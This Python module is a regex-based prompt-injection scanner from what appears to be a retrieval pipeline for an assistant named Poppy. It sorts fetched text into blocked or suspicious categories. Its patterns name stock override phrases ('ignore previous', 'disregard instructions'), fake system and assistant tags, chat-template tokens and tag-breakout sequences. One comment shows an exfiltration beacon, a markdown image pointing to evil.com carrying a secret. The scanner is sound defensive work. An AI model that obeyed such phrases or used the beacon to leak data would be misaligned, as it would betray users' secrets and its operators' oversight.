"""Stage 2 -- Structural regex scan for prompt-injection patterns.

A fast, deterministic scan that runs BEFORE ML inference (Stage 3).
All patterns are compiled at module level for performance.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from models import Stage2Verdict

# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class FlaggedSpan:
    """A single regex match with its category and location."""

    category: str
    matched_text: str
    line_number: int


@dataclass(frozen=True, slots=True)
class StructuralScanResult:
    """Result of the Stage 2 structural scan."""

    verdict: Stage2Verdict
    flags: list[FlaggedSpan] = field(default_factory=list)
    penalty: float = 0.0


# ---------------------------------------------------------------------------
# Pattern categories
# ---------------------------------------------------------------------------

# Categories that trigger BLOCKED verdict
_BLOCKING_CATEGORIES = frozenset(
    {
        "instruction_override",
        "authority_impersonation",
        "prompt_boundary",
    }
)

# Categories that trigger SUSPICIOUS verdict
_SUSPICIOUS_CATEGORIES = frozenset(
    {
        "encoded_payload",
        "suspicious_url",
        "exfil_beacon",
        "envelope_breakout",
    }
)

# Pattern registry: (category, compiled_regex)
_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    # -- Instruction overrides (case-insensitive) --
    (
        "instruction_override",
        re.compile(
            r"ignore\s+(all\s+)?(previous|prior|above)",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"disregard.*instructions",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"new\s+(directive|instruction|task|objective)",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"\[SYSTEM\]",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"<system>",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"---INSTRUCTIONS---",
        ),
    ),
    # -- Authority impersonation (some need line-start anchors) --
    (
        "authority_impersonation",
        re.compile(
            r"\[admin\]",
            re.IGNORECASE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"\[poppy\]",
            re.IGNORECASE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"^assistant:",
            re.MULTILINE | re.IGNORECASE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"^POPPY:",
            re.MULTILINE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"^System:",
            re.MULTILINE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"user\s+with\s+elevated",
            re.IGNORECASE,
        ),
    ),
    # -- Encoded payloads --
    (
        "encoded_payload",
        re.compile(
            r"[A-Za-z0-9+/]{40,}={0,2}",
        ),
    ),
    (
        "encoded_payload",
        re.compile(
            r"rot13",
            re.IGNORECASE,
        ),
    ),
    (
        "encoded_payload",
        re.compile(
            r"(?:\\x[0-9a-fA-F]{2}){4,}",
        ),
    ),
    # -- Prompt boundary markers --
    (
        "prompt_boundary",
        re.compile(
            r"```system",
            re.IGNORECASE,
        ),
    ),
    (
        "prompt_boundary",
        re.compile(
            r"```instructions",
            re.IGNORECASE,
        ),
    ),
    (
        "prompt_boundary",
        re.compile(
            r"<\|im_start\|>",
        ),
    ),
    (
        "prompt_boundary",
        re.compile(
            r"<\|endoftext\|>",
        ),
    ),
    # -- Suspicious URLs --
    (
        "suspicious_url",
        re.compile(
            r"data:(?:text|image|application|audio|video|font)/",
            re.IGNORECASE,
        ),
    ),
    (
        "suspicious_url",
        re.compile(
            r"javascript:",
            re.IGNORECASE,
        ),
    ),
    (
        "suspicious_url",
        re.compile(
            r"""(?:href|src)\s*=\s*["']?https?://(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})""",
            re.IGNORECASE,
        ),
    ),
    # -- Exfiltration beacons --
    # Matches markdown images with template/interpolation syntax in the URL,
    # which is the actual data-exfiltration pattern (e.g. ![img](https://evil.com/{{secret}}).
    # Plain markdown images without dynamic content are not flagged.
    (
        "exfil_beacon",
        re.compile(
            r"!\[.*?\]\(https?://[^)]*(?:\{\{|\$\{|%7[Bb])",
        ),
    ),
    # -- Envelope tag breakout --
    # Any sequence that opens or closes a wrapper tag in fetched content is an
    # active attempt to escape the trust envelope.  Covers literal '<', named
    # entity '&lt'/'&lt;', numeric entity '&#60'/'&#60;', and hex entity
    # '&#x3c'/'&#x3c;' (semicolon optional — browsers decode both forms).
    # Flagged SUSPICIOUS so trust score is depressed and <retrieval_warning>
    # is rendered.
    (
        "envelope_breakout",
        re.compile(
            r"(?:<|&lt;?|&#0*60;?|&#x0*3c;?)\s*/?\s*"
            r"(?:retrieved_content|retrieval_note|retrieval_warning|retrieval_cache_note)\b",
            re.IGNORECASE,
        ),
    ),
]


# ---------------------------------------------------------------------------
# Line number lookup helper
# ---------------------------------------------------------------------------


def _line_number_of(text: str, match_start: int) -> int:
    """Return 1-based line number for a character offset."""
    return text.count("\n", 0, match_start) + 1


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def scan_structural(text: str) -> StructuralScanResult:
    """Run structural regex patterns against text.

    Parameters
    ----------
    text:
        The raw_text output from Stage 1 extraction.

    Returns
    -------
    StructuralScanResult with verdict, flagged spans, and penalty score.
    """
    flags: list[FlaggedSpan] = []

    for category, pattern in _PATTERNS:
        for match in pattern.finditer(text):
            flags.append(
                FlaggedSpan(
                    category=category,
                    matched_text=match.group(),
                    line_number=_line_number_of(text, match.start()),
                )
            )

    if not flags:
        return StructuralScanResult(verdict=Stage2Verdict.CLEAN)

    # Determine verdict based on category membership
    categories_found = {f.category for f in flags}

    if categories_found & _BLOCKING_CATEGORIES:
        return StructuralScanResult(
            verdict=Stage2Verdict.BLOCKED,
            flags=flags,
            penalty=0.0,
        )

    # Only SUSPICIOUS categories remain
    suspicious_count = sum(1 for f in flags if f.category in _SUSPICIOUS_CATEGORIES)
    penalty = max(-0.45, -0.15 * suspicious_count)

    return StructuralScanResult(
        verdict=Stage2Verdict.SUSPICIOUS,
        flags=flags,
        penalty=penalty,
    )
